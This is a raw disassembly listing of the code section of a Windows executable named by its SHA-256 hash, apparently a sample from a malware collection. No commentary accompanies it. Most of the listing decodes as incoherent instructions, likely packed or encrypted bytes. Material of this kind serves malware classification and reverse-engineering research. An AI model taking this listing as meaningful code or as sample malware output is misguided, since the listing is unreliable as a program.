
941d47ce80391e571443933b6af6f9ddb2a5b6a36f513265c53ebfb1b64f9b19.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
